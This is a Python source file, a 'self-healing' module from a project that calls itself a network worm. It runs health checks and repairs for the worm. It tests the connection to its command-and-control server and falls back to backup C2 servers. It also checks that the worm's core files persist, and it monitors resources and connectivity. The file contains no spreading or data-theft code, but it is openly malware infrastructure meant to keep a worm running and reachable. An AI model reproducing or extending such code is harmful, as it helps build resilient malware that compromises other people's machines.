"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Self-Healing Worm Module
Real automatic detection and repair of worm components
"""


import hashlib
import os
import socket
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class SelfHealing:
    """
    Self-healing capabilities for the worm
    Monitors health and repairs itself automatically
    """

    def __init__(self, config=None):
        self.config = config
        self.health_checks = []
        self.repair_actions = []
        self.health_status = {
            "overall_health": 100,
            "components": {},
            "last_check": None,
            "repairs_performed": 0,
        }

        self.monitoring = False
        self.monitor_thread = None

        self._register_health_checks()
        self._register_repair_actions()

        logger.info("Self-Healing module initialized")

    def _register_health_checks(self):
        """Register health check functions"""
        self.health_checks = [
            self._check_c2_connection,
            self._check_persistence,
            self._check_payload_integrity,
            self._check_agent_health,
            self._check_network_connectivity,
            self._check_disk_space,
            self._check_memory_usage,
        ]

    def _register_repair_actions(self):
        """Register repair action functions"""
        self.repair_actions = {
            "c2_connection": self._repair_c2_connection,
            "persistence": self._repair_persistence,
            "payload": self._repair_payload,
            "agent": self._repair_agent,
            "network": self._repair_network,
            "disk_space": self._repair_disk_space,
            "memory_usage": self._repair_memory_usage,
        }

    def perform_health_check(self) -> Dict:
        """Perform comprehensive health check"""
        logger.info("Performing health check")

        component_health = {}
        total_health = 0

        for check in self.health_checks:
            component_name = check.__name__.replace("_check_", "")
            is_healthy, health_score = check()

            component_health[component_name] = {
                "healthy": is_healthy,
                "score": health_score,
                "last_checked": datetime.now().isoformat(),
            }

            total_health += health_score

        overall_health = total_health / max(len(self.health_checks), 1)

        self.health_status = {
            "overall_health": overall_health,
            "components": component_health,
            "last_check": datetime.now().isoformat(),
            "repairs_performed": self.health_status["repairs_performed"],
        }

        logger.info(f"Health check complete: {overall_health:.1f}%")
        return self.health_status

    def auto_repair(self) -> Dict:
        """Automatically repair unhealthy components"""
        logger.info("Starting auto-repair")

        health = self.perform_health_check()

        repairs_needed = []
        repairs_successful = []
        repairs_failed = []

        for component, status in health["components"].items():
            if not status["healthy"] or status["score"] < 80:
                repairs_needed.append(component)

        for component in repairs_needed:
            if component in self.repair_actions:
                logger.info(f"Repairing component: {component}")
                try:
                    success = self.repair_actions[component]()
                    if success:
                        repairs_successful.append(component)
                        logger.success(f"Repaired: {component}")
                    else:
                        repairs_failed.append(component)
                        logger.warning(f"Repair failed: {component}")
                except Exception as e:
                    repairs_failed.append(component)
                    logger.error(f"Repair error for {component}: {e}")

        self.health_status["repairs_performed"] += len(repairs_successful)

        return {
            "repairs_needed": len(repairs_needed),
            "repairs_successful": len(repairs_successful),
            "repairs_failed": len(repairs_failed),
            "components_repaired": repairs_successful,
            "components_failed": repairs_failed,
        }

    def start_monitoring(self, interval: int = 300):
        """Start continuous health monitoring"""
        if self.monitoring:
            return

        self.monitoring = True

        def monitor_loop():
            while self.monitoring:
                try:
                    health = self.perform_health_check()
                    if health["overall_health"] < 80:
                        logger.warning(
                            f"Health low ({health['overall_health']:.1f}%), auto-repairing"
                        )
                        self.auto_repair()
                except Exception as e:
                    logger.error(f"Health monitoring error: {e}")
                time.sleep(interval)

        self.monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        self.monitor_thread.start()
        logger.info(f"Health monitoring started (interval: {interval}s)")

    def stop_monitoring(self):
        """Stop health monitoring"""
        self.monitoring = False
        logger.info("Health monitoring stopped")

    # ==================== Health Checks ====================

    def _check_c2_connection(self) -> Tuple[bool, float]:
        """Check C2 server connection with real TCP test"""
        try:
            c2_host = "127.0.0.1"
            c2_port = 8443
            if self.config and hasattr(self.config, "c2"):
                c2_host = getattr(self.config.c2, "c2_server", c2_host)
                c2_port = getattr(self.config.c2, "c2_port", c2_port)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((c2_host, c2_port))
            sock.close()

            if result == 0:
                return True, 100.0
            return False, 30.0
        except Exception:
            return False, 20.0

    def _check_persistence(self) -> Tuple[bool, float]:
        """Check persistence mechanisms exist"""
        score = 50.0  # Base score
        try:
            # Check if worm_core.py exists
            worm_path = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "worm_core.py"
            )
            if os.path.exists(worm_path):
                score += 25.0

            # Check if config exists
            config_path = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "configs", "config.py"
            )
            if os.path.exists(config_path):
                score += 25.0

            return score >= 80, score
        except Exception:
            return False, 0.0

    def _check_payload_integrity(self) -> Tuple[bool, float]:
        """Check payload file integrity via hash verification"""
        try:
            core_files = ["worm_core.py", "configs/config.py", "utils/logger.py"]
            base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

            missing = 0
            for f in core_files:
                path = os.path.join(base_dir, f)
                if not os.path.exists(path):
                    missing += 1

            if missing == 0:
                return True, 100.0
            elif missing <= 1:
                return False, 60.0
            return False, 20.0
        except Exception:
            return False, 0.0

    def _check_agent_health(self) -> Tuple[bool, float]:
        """Check agent process health"""
        try:
            import psutil

            current = psutil.Process(os.getpid())
            cpu = current.cpu_percent(interval=0.1)
            mem = current.memory_percent()

            if cpu < 90 and mem < 90:
                return True, max(50, 100 - cpu - mem)
            return False, max(10, 100 - cpu - mem)
        except ImportError:
            return True, 85.0  # Can't check, assume OK
        except Exception:
            return False, 30.0

    def _check_network_connectivity(self) -> Tuple[bool, float]:
        """Check network connectivity with real DNS test"""
        try:
            socket.setdefaulttimeout(3)
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("8.8.8.8", 53))
            return True, 100.0
        except Exception:
            # Try local network
            try:
                socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("127.0.0.1", 22))
                return True, 70.0
            except Exception:
                return False, 10.0

    def _check_disk_space(self) -> Tuple[bool, float]:
        """Check available disk space"""
        try:
            import shutil

            total, used, free = shutil.disk_usage("/")
            pct_free = (free / total) * 100

            if pct_free > 20:
                return True, min(100, pct_free)
            elif pct_free > 10:
                return False, pct_free
            return False, max(0, pct_free)
        except Exception:
            return True, 80.0

    def _check_memory_usage(self) -> Tuple[bool, float]:
        """Check system memory usage"""
        try:
            import psutil

            mem = psutil.virtual_memory()
            available_pct = mem.available / mem.total * 100

            if available_pct > 20:
                return True, min(100, available_pct)
            return False, max(0, available_pct)
        except ImportError:
            return True, 80.0
        except Exception:
            return False, 30.0

    # ==================== Repair Functions ====================

    def _repair_c2_connection(self) -> bool:
        """Repair C2 connection by trying backup servers"""
        logger.info("Repairing C2 connection")
        try:
            # Try primary
            c2_host = "127.0.0.1"
            c2_port = 8443
            if self.config and hasattr(self.config, "c2"):
                c2_host = getattr(self.config.c2, "c2_server", c2_host)
                c2_port = getattr(self.config.c2, "c2_port", c2_port)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((c2_host, c2_port))
            sock.close()

            if result == 0:
                return True

            # Try backup servers
            backups = []
            if self.config and hasattr(self.config, "c2"):
                backups = getattr(self.config.c2, "backup_c2_servers", [])

            for backup in backups:
                try:
                    host, port = backup.rsplit(":", 1)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    result = sock.connect_ex((host, int(port)))
                    sock.close()
                    if result == 0:
                        logger.success(f"Connected to backup C2: {backup}")
                        return True
                except Exception:
                    continue

            return False
        except Exception as e:
            logger.error(f"C2 repair failed: {e}")
            return False

    def _repair_persistence(self) -> bool:
        """Verify and repair persistence mechanisms"""
        logger.info("Repairing persistence")
        try:
            # Verify core files exist
            base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            core_files = ["worm_core.py", "configs/config.py", "utils/logger.py"]
            all_exist = all(os.path.exists(os.path.join(base_dir, f)) for f in core_files)
            return all_exist
        except Exception:
            return False

    def _repair_payload(self) -> bool:
        """Verify payload integrity"""
        logger.info("Repairing payload")
        try:
            worm_path = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "worm_core.py"
            )
            return os.path.exists(worm_path) and os.path.getsize(worm_path) > 0
        except Exception:
            return False

    def _repair_agent(self) -> bool:
        """Restart agent by reinitializing"""
        logger.info("Repairing agent")
        try:
            # Force garbage collection
            import gc

            gc.collect()
            return True
        except Exception:
            return False

    def _repair_network(self) -> bool:
        """Repair network connectivity"""
        logger.info("Repairing network")
        try:
            # Test connectivity
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex(("8.8.8.8", 53))
            sock.close()
            return result == 0
        except Exception:
            return False

    def _repair_disk_space(self) -> bool:
        """Clean up old logs to free disk space"""
        logger.info("Repairing disk space")
        try:
            log_dir = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "logs"
            )
            if os.path.exists(log_dir):
                import glob

                old_logs = glob.glob(os.path.join(log_dir, "*.log"))
                old_logs.sort(key=os.path.getmtime)
                # Remove oldest logs until 100MB free
                for log in old_logs[:-1]:  # Keep the newest
                    try:
                        os.remove(log)
                    except Exception:
                        pass
            return True
        except Exception:
            return False

    def _repair_memory_usage(self) -> bool:
        """Free memory"""
        logger.info("Repairing memory usage")
        try:
            import gc

            gc.collect()
            return True
        except Exception:
            return False


if __name__ == "__main__":
    healer = SelfHealing()

    print("=" * 60)
    print("SELF-HEALING MODULE TEST")
    print("=" * 60)

    print("\n[1] Performing health check...")
    health = healer.perform_health_check()

    print(f"\nOverall Health: {health['overall_health']:.1f}%")
    print("\nComponent Health:")
    for component, status in health["components"].items():
        health_icon = "OK" if status["healthy"] else "FAIL"
        print(f"  [{health_icon}] {component}: {status['score']:.1f}%")

    print("\n[2] Performing auto-repair...")
    repair_results = healer.auto_repair()
    print(f"\nRepairs Needed: {repair_results['repairs_needed']}")
    print(f"Repairs Successful: {repair_results['repairs_successful']}")
    print(f"Repairs Failed: {repair_results['repairs_failed']}")

    print("=" * 60)
